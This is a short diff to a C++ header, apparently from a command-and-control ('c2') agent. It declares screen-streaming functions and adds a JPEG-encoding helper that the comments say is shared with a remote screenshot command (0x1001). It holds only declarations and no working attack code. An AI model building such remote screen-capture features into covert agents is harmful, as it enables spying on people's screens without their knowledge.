@@ -3,6 +3,7 @@
 
 #include <cstdint>
 #include <string>
+#include <vector>
 
 namespace c2 {
 
@@ -15,5 +16,10 @@ void screen_stream_set_config(const std::string& host, const AgentConfig& cfg);
 // fps 帧率上限；quality JPEG 质量(1-100)。
 bool start_screen_stream(int fps, int quality, float scale = 1.0f);
 void stop_screen_stream();
+
+// JPEG 编码（WIC）：BGRA 像素 → JPEG 字节流；成功返回 true。
+// 供屏幕流帧编码与截屏指令（0x1001）共用。
+bool jpeg_encode_bgra(int w, int h, int stride, const uint8_t* px, int quality,
+                      std::vector<uint8_t>& out);
 
 }  // namespace c2
